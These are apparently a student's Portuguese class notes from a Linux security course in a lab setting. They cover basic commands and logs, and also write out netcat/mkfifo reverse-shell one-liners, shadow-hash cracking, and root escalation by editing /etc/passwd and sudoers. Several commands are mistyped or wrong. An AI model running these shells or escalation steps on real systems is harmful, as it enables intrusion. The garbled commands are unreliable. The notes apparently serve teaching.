									



@@@@@@@@@@@@@@@@@@AULA 1@@@@@@@@@@@@@@@@@
192.168.122.43

bizu:
em linux os logs ficam na pasta /var/log/syslog
head - lista as 10 primeiras linhas
tail - lista as 10 últimas linhas

====alterar teclado=======
Layout de teclado para ABNT2 - Configuração no Ubuntu (modo texto)

mudar senha do root

$sudo passwd root

1. No terminal, digite como root:

# nano /etc/default/console-setup
# Troque pelo editor de sua preferência

2. Procure a seguinte linha:

    XKBLAYOUT 
3. Altere para br, se o teclado for ABNT2:
de:
XKBLAYOUT="br"  # Layout do teclado (tipo ABNT2=br ou americano=us)
para: 
XKBLAYOUT="ABNT2=br"  

4. Salve a alteração e reinicie. 

===========CONEXÃO CRIPTOGRAFADA SSH=========

ssh msfadmin@192.168.122.43 (((( ssh usuario@IP_alvo  ))))

em seguida deve digitrar a senha, todo o trafego fica criptografado, conexão segura

======BUSCANDO LOGS NA PASTA VAR======
pasta apache contuma ter a access.log

=======VERIFICAR ASSINATURA DE ARQUIVO VIA SSH=======
pode usar o comando "file" para tentar abrir um arquivo, ele irá verificar a assinatura do arquivo
antes de abrir, assim da pra confirmar se a extensão do arquivo está correta

ex: um arquivo log.txt teve a extensão alterada par log.jpg, o comando file identifica a asiinatura, não a extensão
	#file log.jpg       
	#log.jpg: ASCII text


=======varredura verificando direitos=========
ls -lah

/etc/passwd
cat passwd == vc verá os usuários do pc

/etc/shadow
cat shadow == vc vai achar o hash das senhas dos usuário, com eles vc tenta quebrar as senhas com algumas ferramentas, até onlines
ex: crackstation.com

=======comparar conteudos de um 'arquivo de outro===
dif
ex: diff envmsfadmin.txt envroot.txt
também usado para achar diferenças em log

======criar variavel de ambiente no linux======
pode ser usado para alterar alguma variável de ambiente q algum programa use


======shell reverso - o atacante busca o alvo ======= ( a ordem do scrpit pode ser invertida, essa ordem é ideal pq vc não precisa fornecer
 seu ip, alem da porta do alvo ficar disponível mesmo q ele troque de ip)

ALVO - lado do servidor ( a máquina que fornecerá o shell, basicamente ter um script rodando isso em background)
ALVO COM IP PÚBLICO
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc -nlvp localhost 4444 > /tmp/f  

ATACANTE - lado do cliente ( a maquina que atacou, vai puxar o shell)

nc -nv 192.168.122.171(IP público do alvo) 4444

===========shell reverso - o alvo busca o atacante==========

ALVO COM IP PRIVADO
(((ISSO É UM BASH))))
ALVO
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc -nlvp 192.168.122.171(ip_público_atacante) 4444 > /tmp/f  

ATACANTE
nc -nv localhost 4444

@@@@@@@@@@@@@@@@@@@AULA 2@@@@@@@@@@@@@@@@@@@@@@@@

VERIFICAR DIREITO DE ARQUIVO

#ls -lah /etc/passwd

=============ESCALAR PRIVILÉGIO:==========
usuarioteste:x:1002:1002:teste,teste,teste,:/home/usuarioteste:/bin/bash
CASO EU CONSIGA EDITAR O /etc/passwd , basta trocar onde estiver "1002:1002" em "0:0" que 
ele será transformado em root.

OBS: a permissão "/bin/bash" deve ser procurada em usuários com senha fraca.

CASO VC NÃO CONSIGA ABRIR O PASSWD, VC PODE DIRECIONAR UMA SAÍDA DO CAT PARA UM ARQUIVO 
EM UM DIRETÓRIO QUE VC TENHA DIREITO

$cat /etc/passwd > /home/Aluno/secreto.txt ( o arquivo criado irá herdar os direitos do passwd )

OBS: dar direitos usando o chmod, atente para a tabela de codigos decimais, 777, libera tudo para
proprietario, grupo e outros
#chmod 732 passwd


ESCALAR PREVILEGIO:

ALTERAR O /etc/sudoers.d

coloque igual ao do root para o usuário que deseja escalar
ALL=(ALL:ALL) ALL



@@@@@@@@@@@@@@@@AULA 3@@@@@@@@@@@@@@@@@@

====PROCURAR ARQUIVOS COM PERMISSÃO DESEJADA======
#find . -type f -perm 0740
OBS: 0750 , 0777 , TB SÃO ÚTEIS

=====PROCURAR POR ARQUIVOS OCULTOS=====
#find /etc -type f -name ".*"

======PROCURA ARQUIVOS POR PROPRIETÁRIO===
#find . -user msfadmin

======PROCURA ARQUIVOS POR PROPRIETÁRIO E TIPO===
#find . -user msfadmin -name '*.txt'

=====PROCURA POR ARQUIVOS DO GRUPO ROOT====
#find / -group adm
#find /var/www -group www-data  (((apache)))

====PROCURA ARQUIVOS Q FORAM MODIFICADOS NOS ULTIMOS DIAS, NO CASO 5 DIAS===
#find / -mtime 5

===ACESSADOS NO ULTIMOS 5 DIAS====
#find / -atime 5


==FAZENDO BUSCA E EXECUTAR ALGO EM SEGUIDA===
#find / -name "*.pdf" -type f -exec ls - lah {} \;



@@@@@@@REVISAO@@@@@@@


SO LINUX
- Escalação de Privilégios
	permições privilegiadas
		#sudo -l  ou  id
		chmod 750 (o q significa)
		como dar direitos (permissões especiais)
	


- Permissões Especiais (SUID, SGID, Sticky-bit)
- SUDO
- COMANDO PARA SABER QUEM EU SOU E O Q POSSO: sudo -l  ou id


